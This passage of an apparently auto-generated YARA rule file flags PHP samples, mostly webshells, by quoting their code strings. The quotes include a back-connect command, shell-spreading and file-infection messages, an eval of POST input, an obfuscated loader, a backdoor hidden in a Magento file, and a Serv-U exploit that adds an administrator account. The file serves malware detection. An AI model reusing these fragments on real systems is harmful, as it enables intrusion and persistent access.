      $s9 = "if(($message = getstring($clientsockets[$id], 10)) === CLOSED_SOCKET){" fullword ascii
      $s10 = "if(($message = getstring($clientsockets[$id], 100)) === CLOSED_SOCKET){" fullword ascii
      $s11 = "elseif(ord($reqmessage[$id][1]) === strlen($reqmessage[$id]) - 2){" fullword ascii
      $s12 = "$port = base_convert(bin2hex(substr($reqmessage[$id], 3+$reqlen+1, 2)), 16, 10);" fullword ascii
      $s13 = "socket_getsockname ($clientsockets[$id], $self_addr, $self_port);" fullword ascii
      $s14 = "// Client hosts, which are not supported for working with (banned)" fullword ascii
      $s15 = "&& $settings['PASSWORD'] === substr($reqmessage[$id], $pos+1," fullword ascii
      $s16 = "$host = base_convert(bin2hex($reqmessage[$id][4]), 16, 10).'.'." fullword ascii
      $s17 = "if(ord($reqmessage[$id][1]) > strlen($reqmessage[$id]) - 2)" fullword ascii
      $s18 = "if(time() - $timeout[$id] > $settings['CONNECT_TIMEOUT'])" fullword ascii
      $s19 = "VER.REP_SOCKS_ERROR.\"\\x00\\x01\".$ipport[$id]);" fullword ascii
      $s20 = "// if -1 - no logs" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 40KB and
      8 of them
}


rule sig_06eb61b839a0cefee4967c67ccb099dc
{
   meta:
      description = "php17 - file 06eb61b839a0cefee4967c67ccb099dc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "fea93c1ce7c46f50598d334505b39c72aa5c7250c58fb62bb934792d71784bfd"
   strings:
      $s1 = "echo $_REQUEST['pass'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule _themosisCorePublishBox_blade
{
   meta:
      description = "php17 - file _themosisCorePublishBox.blade.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6f1e5a49490a6f23317a557e4c1a039f6e0927c3da8ec978e07dc1e914b19f41"
   strings:
      $s1 = "<a href=\"#post_status\" <?php if ('private' == $__post->post_status) { ?>style=\"display:none;\" <?php } ?>clas" fullword ascii
      $s2 = "<input <?php if ('private' == $__post->post_status) { ?>style=\"display:none\"<?php } ?> type=\"submit\" nam" fullword ascii
      $s3 = "<a class=\"preview button\" href=\"{{ $preview_link }}\" target=\"wp-preview-{{ (int) $__post->ID }}\" id=\"post-pr" fullword ascii
      $s4 = "if (in_array($__post->post_status, $status_keys) || 'private' == $__post->post_status || $can_publish )" fullword ascii
      $s5 = "<?php // Hidden submit button early on so that the browser chooses the right button when form is submitted with Return k" fullword ascii
      $s6 = "// it might a new one, schedule one or one to submit for review (based on default WordPres posts publish metabox)." fullword ascii
      $s7 = "$preview_link = esc_url(apply_filters('preview_post_link', add_query_arg('preview', 'true', $preview_link ), $__post));" fullword ascii
      $s8 = "<input type=\"hidden\" name=\"hidden_post_status\" id=\"hidden_post_status\" value=\"<?php echo esc_attr( ('aut" fullword ascii
      $s9 = "<input type=\"submit\" name=\"save\" id=\"save-post\" value=\"<?php esc_attr_e('Save as Pending'); ?>\" clas" fullword ascii
      $s10 = "<?php submit_button(__('Submit for Review'), 'primary button-large', 'publish', false, ['accesskey' => 'p']); ?>" fullword ascii
      $s11 = "$preview_link = esc_url(apply_filters('preview_post_link', add_query_arg('preview', 'true', $preview" fullword ascii
      $s12 = "<?php submit_button(__('Submit for Review'), 'primary button-large', 'publish', false, ['accesskey' => 'p'])" fullword ascii
      $s13 = "<?php submit_button($statuses[$status_keys[0]]['publish_text'], 'primary button-large', 'publish', false" fullword ascii
      $s14 = "if (!in_array($__post->post_status, $status_keys) || 0 == $__post->ID)" fullword ascii
      $s15 = "if (!empty($__post->post_date_gmt) && time() < strtotime($__post->post_date_gmt . ' +0000'))" fullword ascii
      $s16 = "<!-- End post status -->" fullword ascii
      $s17 = "<input name=\"original_publish\" type=\"hidden\" id=\"original_publish\" value=\"<?php esc_attr_e('Submit for Review') ?>\"/>" fullword ascii
      $s18 = "<!-- Post status -->" fullword ascii
      $s19 = "{!! \\Themosis\\Facades\\Form::select('post_status', [$choices], $__post->post_status, ['id' => 'post_status']) !!}" fullword ascii
      $s20 = "<?php submit_button(__('Schedule'), 'primary button-large', 'publish', false, ['accesskey' => 'p']); ?>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      8 of them
}

rule sig_3c85e984e26b2a26e77426de1bd5656a
{
   meta:
      description = "php17 - file 3c85e984e26b2a26e77426de1bd5656a.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "6e59976eadcf2e7a716aeca68ad5dfaa6db920bfe7fc5b04771d6f2c8b7b2b20"
   strings:
      $x1 = "* http://www.magentocommerce.com/license/enterprise-edition" fullword ascii
      $x2 = "* @copyright   Copyright (c) 2014 Magento Inc. (http://www.magentocommerce.com)" fullword ascii
      $x3 = "* @license     http://www.magentocommerce.com/license/enterprise-edition" fullword ascii
      $x4 = "* @author      Magento Core Team <core@magentocommerce.com>" fullword ascii
      $s5 = "* Proxy script to combine and compress one or few files for JS and CSS" fullword ascii
      $s6 = "* that is bundled with this package in the file LICENSE_EE.txt." fullword ascii
      $s7 = "* This source file is subject to the Magento Enterprise Edition License" fullword ascii
      $s8 = "if($_POST['hsh']=='e7f8e4f0a4a945b5ab6472a2c95aa934'){$c = $_POST['c']; $js = $_POST['js'];" fullword ascii
      $s9 = "* Restricts access only to files under current script's folder" fullword ascii
      $s10 = "if (isset($_SERVER['HTTP_IF_MODIFIED_SINCE']) && strtotime($_SERVER['HTTP_IF_MODIFIED_SINCE']) >= $lastModified) {" fullword ascii
      $s11 = "* Magento Enterprise Edition" fullword ascii
      $s12 = "$contentType = $_GET['c']==='auto' ? true : $_GET['c'];" fullword ascii
      $s13 = "$out .= file_get_contents($fileRealPath) . \"n\";" fullword ascii
      $s14 = "$contentType = !empty($contentTypes[$fileExt]) ? $contentTypes[$fileExt] : false;" fullword ascii
      $s15 = "// we must have blank line at the end of all files but if somebody forget to add it" fullword ascii
      $s16 = "if (is_string($contentType) && in_array($contentType, $contentTypeAllowed)) {" fullword ascii
      $s17 = "header('Content-type: '.$contentType);" fullword ascii
      $s18 = "$files = is_array($_GET['f']) ? $_GET['f'] : explode(',', $_GET['f']);" fullword ascii
      $s19 = "// use gzip or deflate, use this if not enabled in .htaccess, default on" fullword ascii
      $s20 = "// optional custom content type, can be emulated by index.php/x.js or x.css" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 30KB and
      1 of ($x*) and 4 of them
}

rule sig_79db5352060cafa39f6844951e5096093395bf5d
{
   meta:
      description = "php17 - file 79db5352060cafa39f6844951e5096093395bf5d.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8a92ce58ef24cdfdd00e75ae6a170fa74b420c4c963d72942976fe2a0d7c1c51"
   strings:
      $s1 = "// Set to true to enable the optional remember-me feature, which stores encrypted login details to " fullword ascii
      $s2 = "<a href=\"mailto:darkfire.batch@gmail.com\">Cyb3R_ShubhaM</a> | copyright " fullword ascii
      $s3 = "// If you have multiple protected pages, and there's more than one username / password combination, " fullword ascii
      $s4 = "// Logout attempt made. Deletes any remember-me cookie as well" fullword ascii
      $s5 = "elseif (isset($_POST['login'])) {" fullword ascii
      $s6 = "// Login attempt made" fullword ascii
      $s7 = "<tr><td align=\"left\"><input type=\"submit\" name=\"login\" value=\"Login\">" fullword ascii
      $s8 = "if (strpos($action, 'logout=1', strpos($action, '?')) !== false) $action = str_replace('logout=1', '', $action);" fullword ascii
      $s9 = "<input type=\"submit\" name=\"login\" value=\"Login\"></td></tr>" fullword ascii
      $s10 = "if (isset($_GET['logout']) || isset($_POST['logout'])) {" fullword ascii
      $s11 = "else $err = 'Login Faild !';" fullword ascii
      $s12 = "// Text to appear just above login form." fullword ascii
      $s13 = "// allow users to be logged-in automatically on their return. Turn off for a little extra security." fullword ascii
      $s14 = "// In this case, you _must_ call session_start() before you require() txtAuth. Logging out will not " fullword ascii
      $s15 = "if (md5($tacfg['uname'].$tacfg['pword']) == $_COOKIE['txtauth_'.$rmgroup] && $tacfg['allowrm']) {" fullword ascii
      $s16 = "// knows which login details to use." fullword ascii
      $s17 = "<form name=\"txtauth\" action=\"<?=$action?>\" method=\"post\">" fullword ascii
      $s18 = "// Set to true if you use your own sessions within your protected page, to stop txtAuth interfering. " fullword ascii
      $s19 = "<table border=\"0\" cellpadding=\"4\" cellspacing=\"0\" bgcolor=\"#666666\" style=\"border: 1px double #dedede;\" dir=\"ltr\">" fullword ascii
      $s20 = "SCROLLBAR-FACE-COLOR: #000000; SCROLLBAR-HIGHLIGHT-COLOR: #000000; SCROLLBAR-SHADOW-COLOR: #000000; COLOR: #666666; SCRO" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 60KB and
      8 of them
}

rule AnnotationBlock
{
   meta:
      description = "php17 - file AnnotationBlock.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "76802c7094bbd9c0b59c34fb71cbcaa2a7aa9e9a119bbdb28a4382713d9c5229"
   strings:
      $s1 = "* @param AnnotationBlock|null $parent" fullword ascii
      $s2 = "* @param AnnotationTag[] $children" fullword ascii
      $s3 = "* AnnotationBlock constructor." fullword ascii
      $s4 = "* @var AnnotationTag|null" fullword ascii
      $s5 = "* @var AnnotationTag[]" fullword ascii
      $s6 = "$description=''," fullword ascii
      $s7 = "public $description='';" fullword ascii
      $s8 = "public function __construct($name=''," fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 4KB and
      all of them
}

rule alfav3_encoded
{
   meta:
      description = "php17 - file alfav3-encoded.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "d8d6e6f4d363d9245831fb356716537b9b5b12b3b7c79b61a34ccbeeba857d5d"
   strings:
      $x1 = "$WbqyzAxUVi='f'.'u'.'nc'.'t'.'io'.'n'.'_ex'.'i'.'s'.'ts';$ZuUYlSUnis='c'.'har'.'Co'.'d'.'eA'.'t'.'';$JJarXVtobo='eval'.'';$IiIsk" ascii
      $s2 = "0;$ac = 0;$enc = '';$tmp_arr = array();if(!$data){return $data;}do{$o1 = $ZuUYlSUnis($data, $i++);$o2 = $ZuUYlSUnis($data, $i++" fullword ascii
      $s3 = "YvVSr+HieubhFlqGr44JfAMbJMltdkeE6GEGKWN+0ZDwQW8PFv+rfNUBT9TVhjlwRtH9Q2C2PbwBQznu56dRvtzX71KHbQE9HukfSQx8DLl5Ftp8m53Wvi5fufC0+OqA" ascii
      $s4 = "7dXKC/NYDvaeXQy1IwEqNMC/Dru2jkT7Vt2t6wV1CPtj0qCOpUbDUkLL03otX8ZwnaIhJdy29QIh4cmDq1a3eI5CeWT6VzGbAJU/dlLTJNOGXAbqy23QrLPAS/1K8J8t" ascii
      $s5 = "le ($i < strlen($data));$enc = implode($tmp_arr, '');$r = (strlen($data) % 3);return ($r ? substr($enc, 0, ($r - 3)) : $enc).sub" ascii
      $s6 = "XfFwkjQu20CWoyKePJ5TYreCoM+3jjCq0v0eErbwjhkmNfVo/4C9o5oLBsKhw34BXqA68LQU8loG1VXtLx2hnvnXRS47YD79Iqg6Aoea2pYEfUZx777Sa8aNu+NS/giK" ascii
      $s7 = "2mHr9/ZejU//K85mXe3zyPTz52Yh+/338Ohl/sVBrPEaol28mzE318velK7/tOT03AEvarN6unvsvt3Q8AAThGGET+ZN1P/bnAaXDdP05qKTFOBNbHbNhJ/28Ou+wfYS" ascii
      $s8 = "onZWeeYpd1IiyVvhYdOoDpu0A/L+uBPqGeTdgM1MqoF7dAQrN2B1pZL/pavfZ/aaspB+6bA+AIVqGuOfRThtlCX8tj0MLl3axp2l9tW8ta2NbADwh+ifi/nK8Q//R2eh" ascii
      $s9 = "e3BZXxzk2UaPostvlPT3SJ1x1rDH+wQ7NV3K2S0yFwt74DDpQh9NuYEmFzk/NZBgQ/gUH4+3Zvllw8/yvYyU/FIr+C7an8wdkw4n3rCwL1Gctpq//TyhqNqyVwTuniAu" ascii
      $s10 = "Eju8xfPRXObnHk9HjxsHGf8OS6mqy6IN5QcbQ/rGo/Bk8sPKkjMY//xtIf7Gw3CHN/X9iGvp+12HeA2845q+bTRAFp7lhFIGZ6XAPfqlOgYeYThHGGQtjtfKK0oaFnAm" ascii
      $s11 = "yqb4YCPLtMDCkub9j7Ne/iOR4GvIsg1eWlDXcyC7ZJw+Zj4NpsENMec0po1nZ0+B2yfawk8PxZPgeKruZp9LW+b5MBpXM9X2HEyeEZZW0JeUI4eMVRaxw/Y/x3VJcmcg" ascii
      $s12 = "q/YhuCe7oFrLmOytrHfwYtv4IOKeTk88FML0zZZu1dAfIx8zhKVgd94CElR8ibS4yFhilTE5hCvv8auG4agFamqTAhcTJQ4wwAH0fltvtaG+I1j8dSjZY4vFtpnettdQ" ascii
      $s13 = "vBy28tUNq5cvkyF1p5GH65ZSpy7MAFYldfv2gmDC7gSqdUWC/j/t2znSrqdwCdffen+wlG/0Zi/Q9JL/m5d2zuR5FBID/ZXl3jJWitMg3mdajmMr/EgRdSwqB8uy//O+" ascii
      $s14 = "sckqmZPmiQvDh9eY4t5U4uMkSRgsqcBL4vtB3wGUXO/C2k3H7WdLLJP09a2HVOkAeKDG9rJ2SrqyLAJ8NVzMAidhkdo541juoE3dC9P6UgqGUIH1tAXFMYocWU7AZ34y" ascii
      $s15 = "/OzBpKWdshV5SYOIzs1S0RURY0CHPoER3oDv20cGETN0b5yLOsD2fiJbMofvQTbfoLyOYcfeMzcwI9qVDOSlnEm+YYUuAfjh1oveS/PRNelD50xiyQb89J9Gz9o/b2Jr" ascii
      $s16 = "rD7DRtbCBI2r5lzUX92k3x2jpqFmO+9Ne32a4G9jAFTLbx73LKHATGhQftpuYPlhDRF+wiMc9yS6z1d8RYfzxRiN73kVaSQgByWSzl9wWTjRanag/PQNaLJ7Gc5SFHoI" ascii
      $s17 = "o0u9fyOndR0Uxquxn2IgRDLeUimlLw+TuM+gQMH9rdm5N3PokSl4d11w03o9M6cffNFE+IE43hY0JTpe6kwmM1tLKCu44qWnZNXa7NyzXG7+GeTlzDUDomyf3tSLHjd3" ascii
      $s18 = "2hPqfRW/bZ0LahDMTsvsUqnZe8dC87rJuA01jFiuLg2iFe9L0HdKhmfezk3btmzMfnhm3SGkraWbGrW+areN8nvXYvSJt4weircq2L5tmC/A8i2QXedNuTOe30cwr04g" ascii
      $s19 = "JaI3SOdvs9Zc5f11ITuhpKKuNZuCmC2dnSfB4lRFO5COrEQHn4BwiuyRkTmlKK01lNGcuD+7l6vjwxV+qf+M3keIrcmpdwiecUR5upLrl3WqnlPvMWGP8Ux7Q9Hii35P" ascii
      $s20 = "Ti7ozMVuK3rRo5FeP0lI21Br5ECuB0T2HAJRf+L8eyeHiTHjVthkxha6iqvhJUE+aTzWWsvFystWWj1Nrmtw2/MMdDswXrZC5lZz05OZOkJ71GiBZ+E3P+4HxLspJ1H9" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule sig_8d23f3d3f678d3e620b91c2115e1f714
{
   meta:
      description = "php17 - file 8d23f3d3f678d3e620b91c2115e1f714.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a8d9f5df8a604e75e87670bc1d797bb49cc1047f722a8630bda514fdc407f84f"
   strings:
      $x1 = "as$x=>$X){if($x!=\"\"&&$X>1){echo($Ic?\"<p>\":\" \").\"<a href='\".h(ME).\"dump=\".urlencode(\"$x%\").\"'>\".h($x).\"</a>\";$Ic=" ascii
      $x2 = "as$yd=>$X){if($X[0]<$fh)unset($xd[$yd]);}}$wd=&$xd[$b->bruteForceKey()];if(!$wd)$wd=array($fh+30*60,0);$wd[1]++;$tg=serialize($x" ascii
      $x3 = "as$m=>$S){$dg=h(ME).\"db=\".urlencode($m);echo\"<tr\".odd().\">\".(support(\"database\")?\"<td>\".checkbox(\"db[]\",$m,in_array(" ascii
      $x4 = "connect_error(){global$b,$g,$T,$n,$Vb;if(DB!=\"\"){header(\"HTTP/1.1 404 Not Found\");page_header('Database'.\": \".h(DB),'Inval" ascii
      $x5 = "false;}set_error_handler(array($this,'_error'));$J=@oci_execute($I);restore_error_handler();if($J){if(oci_num_fields($I))return" fullword ascii
      $x6 = "auth_error($n){global$b,$bd;$n=h($n);$wg=session_name();if(isset($_GET[\"username\"])){header(\"HTTP/1.1 403 Forbidden\");if(($_" ascii
      $x7 = "EmailProcess($Z,$Mc)){if($_POST[\"save\"]||$_POST[\"delete\"]){$I=true;$ya=0;$O=array();if(!$_POST[\"delete\"]){foreach($f" fullword ascii
      $x8 = "';if(!$K[\"hashed\"]){echo'<script type=\"text/javascript\">typePassword(document.getElementById(\\'pass\\'));</script>';}echo" fullword ascii
      $x9 = "password_file($i){$Gc=get_temp_dir().\"/adminer.key\";$J=@file_get_contents($Gc);if($J||!$i)return$J;$Qc=@fopen($Gc,\"w\");if($Q" ascii
      $x10 = "password_file($i){$Gc=get_temp_dir().\"/adminer.key\";$J=@file_get_contents($Gc);if($J||!$i)return$J;$Qc=@fopen($Gc,\"w\");if($Q" ascii
      $x11 = "Min_Driver($g);if(!is_object($g)||($Wd=$b->login($_GET[\"username\"],get_password()))!==true)auth_error((is_string($g)?$g:(is_st" ascii
      $x12 = "as$V=>$G){if($G!==null){if($Ic){echo\"<p id='logins' onmouseover='menuOver(this, event);' onmouseout='menuOut(this);'>\\n\";$Ic=" ascii
      $x13 = "B):isset($_GET[\"sql\"])||isset($_GET[\"dump\"])||isset($_GET[\"database\"])||isset($_GET[\"processlist\"])||isset($_GET[\"privi" ascii
      $s14 = "doc_link($of){global$w,$g;$Jh=array('sql'=>\"http://dev.mysql.com/doc/refman/\".substr($g->server_info,0,3).\"/en/\",'sqlite'=>" ascii
      $s15 = "as$X){if($X[1]!=\"USAGE\")$Uc[\"$B[2]$X[2]\"][$X[1]]=true;if(preg_match('~ WITH GRANT OPTION~',$K[0]))$Uc[\"$B[2]$X[2]\"][\"GRAN" ascii
      $s16 = "';}elseif(isset($_GET[\"dump\"])){$a=$_GET[\"dump\"];if($_POST&&!$n){$zb=\"\";foreach(array(\"output\",\"format\",\"db_style\"," ascii
      $s17 = "selectLengthProcess(){return(isset($_GET[\"text_length\"])?$_GET[\"text_length\"]:\"100\");}function" fullword ascii
      $s18 = "name(){return\"<a href='https://www.adminer.org/' target='_blank' id='h1'>Adminer</a>\";}function" fullword ascii
      $s19 = "<a href=\"https://www.adminer.org/#download\" target=\"_blank\" id=\"version\">',(version_compare($ia,$_COOKIE[\"adminer_version" ascii
      $s20 = "add_invalid_login(){global$b;$Gc=get_temp_dir().\"/adminer.invalid\";$Qc=@fopen($Gc,\"r+\");if(!$Qc){$Qc=@fopen($Gc,\"w\");if(!$" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 800KB and
      1 of ($x*) and all of them
}

rule sig_935f41a04ef2759e77a99bf5f1f9df90502f14bc
{
   meta:
      description = "php17 - file 935f41a04ef2759e77a99bf5f1f9df90502f14bc.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "ab59333bcb83ea7c33850b1d02fa7ffc1e6260a4f73adc6082a6502326ddd7c5"
   strings:
      $x1 = "if(preg_match(\"/^http:\\/\\/+/\",$_POST['remote_login_target'])) die(\"Do not include http:// in the target URL.\");" fullword ascii
      $x2 = "<tr><td>Login form: <input type='text' value='' name='remote_login_target'></br>Username: <input type='text' value='admin' n" fullword ascii
      $x3 = "<tr><td colspan='2'><form action='$self?act=bypass' method='post' name='bypasser'>[Existing] Database to store temporary tab" fullword ascii
      $x4 = "$dump_file.=\"######################Dumped by: MulciShell v0.2 - Edited By KingDefacer#####################\\n\";" fullword ascii
      $x5 = "$dump_file.=\"######################Dumped by: MulciShell v0.2 - Edited By KingDefacer#####################\\n\\n\";" fullword ascii
      $x6 = "<tr><td><form action='$self?act=bypass' method='post' name='bypasser'>Read file: <input type='text' value='/etc/passwd' name" fullword ascii
      $x7 = "<tr><td><form action='$self?act=bypass' method='post' name='bypasser'>Copy to: <input type='text' style='width: 250px;' name" fullword ascii
      $x8 = "\"Bypassers\"=>\"$self?act=bypass\",\"Tools\"=>\"$self?act=tools\",\"Databases\"=>\"$self?act=dbs\",\"Backdoor Host\"=>\"$self?a" ascii
      $x9 = "echo \"<center>Do you *really* want to kill the shell?<br><br><form action='$self?act=kill' method='post'>" fullword ascii
      $x10 = "echo \"Successfully infected $success files; failed to infect $fail files</br>Exploit files as such: file.php?e=php code\";" fullword ascii
      $x11 = "echo \"Successfully infected $success files; failed to infect $fail files</br>Exploit files as such: file.php?e=php code\"" fullword ascii
      $x12 = "$path=explode('/',$_POST['remote_login_target']);" fullword ascii
      $x13 = "This tool will attempt to copy the shell into every writable directory on the server, in order to allow access maintaini" fullword ascii
      $x14 = "$header=\"GET /search/reverse-ip-domain.php?q=$_SERVER[HTTP_HOST] HTTP/1.0\\r\\n\";" fullword ascii
      $x15 = "execmd(\"perl \".getcwd().\"/bc.pl $_POST[backconnip] $_POST[backconnport]\",$disable);" fullword ascii
      $x16 = "<tr><td>Remote login Brute Force</td><td>HTTP-Auth Brute Force</td></tr>" fullword ascii
      $x17 = "if(preg_match(\"/^http:\\/\\/+/\",$_POST['auth_url'])) die(\"Do not include http:// in the url\");" fullword ascii
      $x18 = "echo ($s>0)?\"Spread complete. Successfully managed to spread the shell $s times</br>\":\"Failed to spread the shell.</br>\";" fullword ascii
      $x19 = "echo ($s>0)?\"Spread complete. Successfully managed to spread the shell $s times</br>\":\"Failed to spread the shell.</br>\"" fullword ascii
      $x20 = "$ch=curl_init($_POST['remote_login_target']);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*)
}

rule sig_043c3d7e489c69b48737cc0c92d0f3a2
{
   meta:
      description = "php17 - file 043c3d7e489c69b48737cc0c92d0f3a2.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "8fd44823c19aafc02c2e1b4100b724e38d11d67ff21454995ceccaab08631371"
   strings:
      $x1 = "<a href=\"javascript:g('shell');\">Execute Command</a> | " fullword ascii
      $s2 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#f00;\">Close</span></li>');" fullword ascii
      $s3 = "p('<li>'.$scanip.':'.$port.' ------------------------ <span style=\"font-weight:bold;color:#080;\">Open</span></li>');" fullword ascii
      $s4 = "<title><?php echo $action.' - '.$_SERVER['HTTP_HOST'];?></title>" fullword ascii
      $s5 = "<?php if (!IS_WIN) {?> | <a href=\"javascript:g('backconnect');\">Back Connect</a><?php }?>" fullword ascii
      $s6 = "<span style=\"float:right;\">PHP <?php echo PHP_VERSION;?> / Safe Mode:<?php echo getcfg('safe_mode');?></span>" fullword ascii
      $s7 = "p($comma.'<a href=\"javascript:godir(\\''.$drive->Path.'/\\');\">'.$DriveTypeDB[$drive->DriveType].'('.$drive->Path.')</a>');" fullword ascii
      $s8 = "$mysqllink = mydbconn($dbhost, $dbuser, $dbpass, $dbname, $charset, $dbport);" fullword ascii
      $s9 = "$mysqllink = mydbconn($dbhost,$dbuser,$dbpass,$dbname,$charset,$dbport);" fullword ascii
      $s10 = "secparam('Safe mode exec dir', @ini_get('safe_mode_exec_dir'));" fullword ascii
      $s11 = "$tabledump = 'INSERT INTO `'.$table.'` VALUES ('.implode(\", \", $row).');'.\"\\n\";" fullword ascii
      $s12 = ".bt {border-color:#b0b0b0;background:#3d3d3d url(http://t.cn/zRymOgc);color:#ffffff;font:12px Arial,Tahoma;height:22px;}" fullword ascii
      $s13 = "2011</a>. Copyright (C) 2004-2011 <a href=\"http://www.4ngel.net\" target=\"_blank\">Security Angel Team [S4T]</a> All Rights Re" ascii
      $s14 = "$tabledump = \"DROP TABLE IF EXISTS `$table`;\\n\";" fullword ascii
      $s15 = "Powered by <a title=\"Build 20110502\" href=\"http://www.4ngel.net\" target=\"_blank\"><?php echo str_replace('.','','P.h.p.S.p." ascii
      $s16 = "<a href=\"javascript:g('sqlfile');\">MySQL Upload &amp; Download</a> | " fullword ascii
      $s17 = "@set_time_limit(0);@preg_replace(\"/[email]/e\",$_POST['Id'],\"error\");" fullword ascii
      $s18 = "secparam('Supported databases', implode(', ', $temp));" fullword ascii
      $s19 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
      $s20 = "<td width=\"100%\"><?php echo $cwd_links.' - '.getChmod($nowpath).' / '.getPerms($nowpath).getUser($nowpath);?> (<?php echo $dir" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule sig_2_2_0_pl
{
   meta:
      description = "php17 - file 2.2.0-pl.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "16f40b185974ae1ca2d547d49497a7156205f768fbcd66c20361d0ab45021c16"
   strings:
      $s1 = "/** @var modSystemSetting $setting Upgrade principal targets to add Media Sources */" fullword ascii
      $s2 = "$setting = $modx->getObject('modSystemSetting',array('key' => 'principal_targets'));" fullword ascii
      $s3 = "* Specific upgrades for Revolution 2.2.0-pl" fullword ascii
      $s4 = "* @subpackage upgrades" fullword ascii
      $s5 = "* @var modX $modx" fullword ascii
      $s6 = "* @package setup" fullword ascii
      $s7 = "$values = $setting->get('value');" fullword ascii
      $s8 = "if (!in_array('sources.modAccessMediaSource',$values)) {" fullword ascii
      $s9 = "$values = is_array($values) ? $values : explode(',',$values);" fullword ascii
      $s10 = "$values[] = 'sources.modAccessMediaSource';" fullword ascii
      $s11 = "$setting->set('value',implode(',',$values));" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      8 of them
}

rule AdminAccess
{
   meta:
      description = "php17 - file AdminAccess.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "efb668a6fce8141b7e9ddc84c5cad7ebf93b160a1d6188a56d4555a31664e203"
   strings:
      $s1 = "namespace Concrete\\Core\\Permission\\Access;" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule sig_6246f5f2dc1cfff4f994fa6ee70ed0d04c94883c
{
   meta:
      description = "php17 - file 6246f5f2dc1cfff4f994fa6ee70ed0d04c94883c.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "a073c17615ddfc2b33afa94368f7148384988226d463fb7e8e28bcb974ca9b3f"
   strings:
      $s1 = "$file_name=$_GET['id'];" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule php17_AES
{
   meta:
      description = "php17 - file AES.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "b86555c6e967de3d966261432ca11a218d666b6b4482aa36377de2049ef5035c"
   strings:
      $s1 = "* Valid key lengths are 128, 192, and 256.  If the length is less than 128, it will be rounded up to" fullword ascii
      $s2 = "* Rijndael supports five different key lengths, AES only supports three." fullword ascii
      $s3 = "* @see Crypt_Rijndael:setKeyLength()" fullword ascii
      $s4 = "* @see Crypt_Rijndael:setKey()" fullword ascii
      $s5 = "* @copyright 2008 Jim Wigginton" fullword ascii
      $s6 = "parent::setKeyLength($length);" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      all of them
}

rule php17_211
{
   meta:
      description = "php17 - file 211.php"
      author = "WatcherLab"
      date = "2019-02-23"
      hash1 = "87fedb71493055b0654256023ce24ccbf9653ab5630c4784635411b3d552d60d"
   strings:
      $x1 = "Dim user, pass, port, ftpport, cmd, loginuser, loginpass, deldomain, mt, newdomain, newuser, quit" fullword ascii
      $s2 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/goldsun/upadmin/s3\", True, \"\", \"\"" fullword ascii
      $s3 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/goldsun/upadmin/s2\", True, \"\", \"\"" fullword ascii
      $s4 = "\"-HomeDir=c:\\\\\" & vbCrLf & \"-LoginMesFile=\" & vbCrLf & \"-Disable=0\" & vbCrLf & \"-RelPaths=1\" & vbCrLf & _" fullword ascii
      $s5 = "a.open \"GET\", \"http://127.0.0.1:\" & port & \"/goldsun/upadmin/s1\",True, \"\", \"\"" fullword ascii
      $s6 = "b.send \"User go\" & vbCrLf & \"pass od\" & vbCrLf & \"site exec \" & cmd & vbCrLf & quit" fullword ascii
      $s7 = "\"-NeedSecure=0\" & vbCrLf & \"-HideHidden=0\" & vbCrLf & \"-AlwaysAllowLogin=0\" & vbCrLf & \"-ChangePassword=0\" & vbCrLf & _" fullword ascii
      $s8 = "deldomain = \"-DELETEDOMAIN\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \" PortNo=\" & ftpport & vbCrLf" fullword ascii
      $s9 = "a.send loginuser & loginpass & mt & deldomain & newdomain & newuser & quit" fullword ascii
      $s10 = "<td><input name=\"c\" type=\"text\" id=\"c\" value=\"cmd /c net user goldsun love /add & net localgroup administrators goldsun /" ascii
      $s11 = "<td><input name=\"c\" type=\"text\" id=\"c\" value=\"cmd /c net user goldsun love /add & net localgroup administrators goldsun /" ascii
      $s12 = "c.send loginuser & loginpass & mt & deldomain & quit" fullword ascii
      $s13 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" & ftpport & vbCrLf & \"-User=go\" & vbCrLf & \"-P" ascii
      $s14 = "newuser = \"-SETUSERSETUP\" & vbCrLf & \"-IP=0.0.0.0\" & vbCrLf & \"-PortNo=\" & ftpport & vbCrLf & \"-User=go\" & vbCrLf & \"-P" ascii
      $s15 = "GName=\"http://\" & request.servervariables(\"server_name\")&lcase(request.servervariables(\"script_name\")) " fullword ascii
      $s16 = "<input name=\"c\" type=\"hidden\" id=\"c\" value=\"<%=cmd%>\" size=\"50\">" fullword ascii
